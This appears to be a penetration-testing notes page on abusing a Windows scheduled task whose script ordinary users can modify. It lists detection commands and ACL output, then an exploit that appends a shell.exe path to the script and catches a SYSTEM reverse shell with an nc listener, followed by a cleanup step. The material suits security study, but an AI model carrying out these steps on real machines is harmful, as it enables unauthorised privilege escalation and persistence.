# Scheduled Tasks

Schedule tasks are predefined actions that can be automatically executed when a certain number of conditions are met. If the attackers were able to find any kind of misconfiguration or if it's enabled to let the users to modify it which will be taken an advantage and can be used as a persistence technique.

## 01 - Detect

### 1.1 - Command Prompt

```
C:\> schtasks /query /fo LIST 2>nul | findstr TaskName

C:\> dir C:\DevTools\
 Volume in drive C has no label.
 Volume Serial Number is 54A8-AA62

 Directory of C:\DevTools

06/05/2020  07:32 AM               173 CleanUp.ps1
               1 File(s)            173 bytes
               0 Dir(s)  31,294,156,800 bytes free


C:\> type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log

C:\> icacls C:\DevTools\CleanUp.ps1
C:\DevTools\CleanUp.ps1 BUILTIN\Users:(M)
                        NT AUTHORITY\SYSTEM:(F)
                        BUILTIN\Administrators:(F)
                        WIN-QBA94KB3IOF\Administrator:(F)
                        NT AUTHORITY\SYSTEM:(I)(F)
                        BUILTIN\Administrators:(I)(F)
                        BUILTIN\Users:(I)(RX)
```

### 1.2 - Powershell

```
PS C:\> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

PS C:\> Get-ACL C:\DevTools\CleanUp.ps1 | fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\DevTools\CleanUp.ps1
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  Modify, Synchronize
         WIN-QBA94KB3IOF\Administrator Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;;FA;;;SY)(A;;FA;;;BA)(A;;0x1301bf;;;BU)(A;;FA;;;LA)(
         A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)
```

## 02 - Exploit

```
C:\> copy shell.exe C:\Temp\shell.exe

C:\> copy C:\DevTools\Cleanup.ps1 Cleanup.bak

C:\> echo C:\Temp\shell.exe >> C:\DevTools\Cleanup.ps1

C:\> type C:\DevTools\Cleanup.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
C:\Temp\shell.exe

$ sudo nc -lnvp 53

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.138.58.
Ncat: Connection from 10.10.138.58:49935.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## 03 - Cleanup

`C:\Windows\system32> copy Cleanup.bak C:\DevTools\Cleanup.ps1`